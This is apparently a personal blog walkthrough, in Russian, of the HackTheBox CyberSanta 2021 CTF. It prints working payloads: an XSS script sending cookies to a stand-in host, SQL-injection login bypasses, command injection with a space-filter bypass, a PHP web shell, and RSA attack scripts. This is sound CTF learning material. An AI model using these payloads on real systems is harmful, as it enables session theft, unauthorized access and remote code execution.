---
title: My CyberSanta2021 Walkthrough
tags: [ctf, hackthebox]
date: 2021-12-20 20:00:00 +0300
categories: [CTF, HackTheBox]
image:
  path: /assets/img/CyberSanta-cover-img.png
  width: 1000   # in pixels
  height: 400   # in pixels
  alt: image alternative text
---

# Краткий отчёт по CTF от HackTheBox.

## Описание

CTF'ка была расчитана больше на новичков и включала пять категорий:
- Web
- Pwn
- Crypto
- Reverse
- Forensics

Каждый день добавлялось 1 задание в каждую категорию.

Итоговая сводка:

| День | Web | Crypto | Pwn | Reverse | Forensics |
|------|-----|--------|-----|---------|-----------|
|1|✅|✅|❌|❌|✅ |
|2|✅|✅|❌|❌|❌ |
|3|✅|✅|❌|❌|❌ |
|4|✅|❌|❌|❌|❌ |
|5|❌|❌|❌|❌|❌ |

## Day 1.

### Web 1. Toy Workshop.

Задание на XSS уязвимость. В исходном коде сайта, была JS функция, при вызове которой появлялась форма для отправки пожеланий. В которой было сказано что-то типа: "Отправьте нам пожелание и Санта обязательно его посмотрит". Очевидный намёк на XSS. Никаких защитных механизмов куки не было обнаружено. Делаем самый стандартный пейлоад, для кражи куки:

```html
<script>new Image().src="hookbin.example?c="+document.cookie;</script>
```

И на хукбине смотрим запрос с перехваченной куки, в которой значение и было флагом. ✅

### Crypto 1. Common Mistake.
В этом задании нужно было проэксплуатировать одну из многочисленных атак на алгоритм RSA, а именно атаку Common Modulus (на что намекает название).
Исходные данные:

- n1 = n2 = <какое-то большое число>
- e1 = 65537
- e2 = 35
- c1 = <какое-то большое число>
- c2 = <какое-то большое число>

Атака заключается в нахождении коэффициентов "a" и "b" для выражения: `(a*e1) + (b*e2) = 1`. Это так называемый расширенный алгоритм Евклида. На любом онлайн сервисе находим, что:
> a = -2
> b = 3745

Теперь, зная эти коэффициенты, можно получить изначальное не зашифрованное сообщение. По следующей формуле:
> `(c1^a) * (c2^b) = M` , где M - изначальное сообщение.

Python script:
```python
from Crypto.Util.number import long_to_bytes
n = <number>
e1 = 65537
c1 = <cipher text 1>
e2 = 35
c2 = <cipher text 2>
a = -2
b = 3745
c1_inv = pow(c1, a, n)
c2_inv = pow(c2, b, n)
ans = (c1_inv * c2_inv) % n
print(long_to_bytes(ans))
```
✅
### Forensics 1. baby APT.
Просто .pcap файл открыл в Wireshark. Полистал TCP потоки, и там в Base64 кодировке передавался флаг.
✅
### Pwn 1. Mr Snowy. 
Не сделал. ❌
### Reverse 1. Infiltration.
Не сделал. ❌


## Day 2.
### Web 2. Toy Management.

Задание на эксплуатацию SQL инъекции. На сайте встречает стандартная форма аутентификации. Пробуем зайти со следующим пейлоадом в поле username:

> `' or 1=1 -- -`

Проваливаемся в профайл аккаунта `manager`. Смотрим исходники сайта, которые были даны в задании. И в файле  database.sql видно, что есть два юзера `manager` и `admin`. Разлогиниваемся и пробуем следующий пейлоад:

>`admin' -- -`

Проваливаемся в аккаунт админа, и там берём флаг. ✅

### Crypto 2. XMAS Spirit.

Дан исходный код с помощью которого шифровали pdf документ:

```python
import random
from math import gcd

def encrypt(dt):
	mod = 256
	while True:
		a = random.randint(1,mod)
		if gcd(a, mod) == 1: break
	b = random.randint(1,mod)

	res = b''
	for byte in dt:
		enc = (a*byte + b) % mod
		res += bytes([enc])
	return res

dt = open('letter.pdf', 'rb').read()

res = encrypt(dt)

f = open('encrypted.bin', 'wb')
f.write(res)
f.close()
```

В коде видно, что берётся два рандомных значения `a` и `b`. При чем такие, что:

> a = [1, 3, 5, ..., 255]
> b = [1, 2, 3, ..., 256]

Следовательно общее кол-во возможных значений `a` и `b` равно `32768` (128 * 256).

Так как тут применятся алгоритм типа XOR, то если зашифрованное сообщение ещё раз по**XOR**ить, то оно вернётся в изначальное. Зная, что у PDF файла, есть сигнатура, а именно 4 первых байта - `'\x25\x50\x44\x46'`, то будем XORить 4 первых байта зашифрованного файла, и сравнивать их с этими 4-мя, если они равны, то мы нашли нужные значения `a` и `b`. Скрипт для решения(уже после нахождения `a` и `b`):

```python
#for a in range(1, 256, 2): 
#	for b in range(1, 256):  
f = open("encrypted.bin", "rb").read()
res = b''
a = 153
b = 96
for i in f:
	dec = (a*i + b) % 256
	res += bytes([dec])
print(res)
		#if (res == b'\x25\x50\x44\x46'):
		#	print(a, b)
s = open('result.pdf', 'wb')
s.write(res)
s.close()
```
 ✅
### Pwn 2. Sleigh. 
Не сделал. ❌
### Reverse 2. Gift Wrapping. 
Не сделал. ❌
### Forensics 2. Honeypot. 
Не сделал. Хотя очень пытался. Просто в задании было сказано, что в дампе памяти была именно какая-то малварь, и я опирался на эти данные. По итогу, под малварю, они имели ввиду скрипт powershell'ный который открывал на ютубе видос Рика Эстли. А этот скрипт я много раз видел, но подумал, что это точно не то, что нужно.  ❌

## Day 3.
### Web 3. Gadget Santa. 
В этом задании эксплуатировалась уязвимость типа RCE. Был интерфейс, который позволял выполнить некоторые встроенные команды, по типу проверки работающих процессов, текущие подключения к хосту и тд. Команды передавались GET запросом, в параметре `command`, попробовав в поле команды вставить `; id` она вывела информацию. Проблема заключалась в фильтрации пробелов, что не позволяло вывести команды типа `ls -al` и тд. 
![web3](https://i.imgur.com/BYmCykC.png){: .mx-auto.d-block :}

Погуглив, узнал некоторые пути обхода. Попробовал следующий пейлоад: `;ls${IFS}-al` и он сработал, в исходниках было написано, что флаг находится на `localhost:3000/get_flag`
Пробуем обратиться через curl:

>`;curl${IFS}localhost:3000/get_flag`

И получаем флаг. ✅

### Crypto 3. Missing Reindeer.

Снова атака на RSA, но чуть похитрее сделана. Было дано сообщение электронной почты (.eml). А котором были публичный ключ RSA и само зашифрованное сообщение. С помощью тулзы RsaCtfTool, сдампливаем параметры `n` и `e` из публичного ключа. Узнаем, что `e` очень маленькое, а именно равно `3`. Чуть погуглив, узнаю, что тут скорее всего атака на RSA под названием Cube Root. Честно взяв алгоритм с первого попавшегося сайта, выполняем задание:
```python
# Функция от сюда - https://riptutorial.com/python/example/8751/computing-large-integer-roots
def nth_root(x, n):
    # Start with some reasonable bounds around the nth root.
    upper_bound = 1
    while upper_bound ** n <= x:
        upper_bound *= 2
    lower_bound = upper_bound // 2
    # Keep searching for a better result as long as the bounds make sense.
    while lower_bound < upper_bound:
        mid = (lower_bound + upper_bound) // 2
        mid_nth = mid ** n
        if lower_bound < mid and mid_nth < x:
            lower_bound = mid
        elif upper_bound > mid and mid_nth > x:
            upper_bound = mid
        else:
            # Found perfect nth root.
            return mid
    return mid + 1

c = 3778608670452741690585532070582737668282151949640402971008788675797867361769689843795603772570139166588578774047027062261466175271392436524653959718229204843915061726484932376601163405265201763831847338823471193932707736077364458453053284027613438860180982451957373644892420683829816445662870127785631688212264667656902285465215893696422157358833968897797828703078065238512429996646780856030831270941538206089269140998459840179372535825110571621961016595399813535271853291603009139930478398009395635275428350832860405110482112603276542371203486280518726687143561313790881202021
n = 29052360453120059177701146498207729611014362120841772147885284668310294675407700581246333337318872050600353022438909391852076208405990507154764842795064455368228014381969783955360165426546947312973195061115837228105648770122442650123819968683831588775039837617788817831554836487051931001049480790287468125246758818911220414888048673899462271009956700067150701189256017793349102117503912782889345559816174845605183913828898737756645848010661322897081850561427949550036638510279173557403134806365178654334553002357480355906235714208451535185647256346503450896572487047615057007598805977277186223884121839444217172432487
e = 3


for k in range(5000000):
	r = nth_root(c + k * n, e)
	l = hex(r)[2:]
	if len(l) % 2 == 1:
		l = "0" + l
	m = b''.fromhex(l)
	if b'HTB' in m:
		print(m)
		break
```
✅

### Pwn 3. Naughty List. 
Не сделал. ❌
### Reverse 3. Intercept. 
Не сделал. ❌
### Forensics 3. Persist. 
Не сделал. ❌

## Day 4. 
### Web 4. Elf Directory.

В этом задании эксплуатировалась недостаточная фильтрация загружаемых файлов и слабый алгоритм генерации кук. Для начала заходя на сайт можно зарегаться. Регаем аккаунт, и нас кидает в свой профиль, где сказано, что только админ может редактировать профиль. Смотрим нашу куку, и видим, что это просто URL_Base64 закодированная строка, меняем в ней параметр _**название которого я забыл**_  с `false` на `true`. Теперь мы можем редактировать свой профиль, сначала я попробовал изменить никнейм на `<h1>asd</h1>` и html код отработал, но идея об XSS отпала, потому что нет пользователя у которого можно украсть куки. (P.S. на сайте можно было регнуться с любым именем, а можно было вообще не регаться, и сразу в самой куки менять ник на любой и заходить на пустой профиль). Потом попробовал загрузить фотографию себе в профиль, и перехватив запрос в BurpSuite. Попробовал загрузить PHP веб шелл:

```php
<?php
	if(isset($_REQUEST['cmd'])){
	        echo "<pre>";
	        $cmd = ($_REQUEST['cmd']);
	        system($cmd);
	        echo "</pre>";
	        die;
	}
?>
```
И теперь открывая загруженную "картинку", получаем шелл, передавая в параметр cmd команды. Чуть полазив по директориям, находим флаг. ✅

### Crypto 4. Naughty List. 
Не сделал. ❌
### Pwn 4. Minimelfistic. 
Не сделал. ❌
### Reverse 4. Upgraded. 
Не сделал. ❌
### Forensics 4. Giveaway. 
Не сделал. ❌

## Day 5.
### Web 5. Naughty or Nice.
Прикольное было задание, но сделать не успел =)
❌
### Crypto 5. Warehouse Maintenance. 
Не сделал. ❌
### Pwn 5. Music Notes. 
Не сделал. ❌
### Reverse 5. Bamboozled. 
Не сделал. ❌
### Forensics 5. Ho Ho Ho. 
Не сделал. ❌

## Resume


| Place | Solved Challenges | Total Points |
|-------|-------------------|--------------|
|542/7996 | 8/25 | 2400/7875 |


